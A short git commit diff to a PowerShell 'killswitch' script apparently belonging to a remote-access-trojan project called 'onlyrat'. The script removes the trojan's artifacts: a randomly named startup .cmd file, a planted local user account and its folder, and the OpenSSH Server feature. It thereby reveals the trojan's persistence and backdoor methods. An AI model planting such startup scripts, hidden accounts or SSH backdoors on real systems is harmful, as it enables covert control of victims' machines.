1b988aa2ea937278cc1885a1a55cc923702c3a20
Blue Cosmo <bluecosmo@localhost.localdomain>
2022-04-16 20:49:41 -0400

    test8

--- payloads/killswitch.ps1
+++ payloads/killswitch.ps1
@@ -1,4 +1,4 @@
-Remove-Item "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/GiLqXiexKP.cmd\"
+Remove-Item "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/GiLqXiexKP.cmd"
 Remove-LocalUser -Name "onlyrat"
 Remove-Item "C:/Users/onlyrat"
 Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
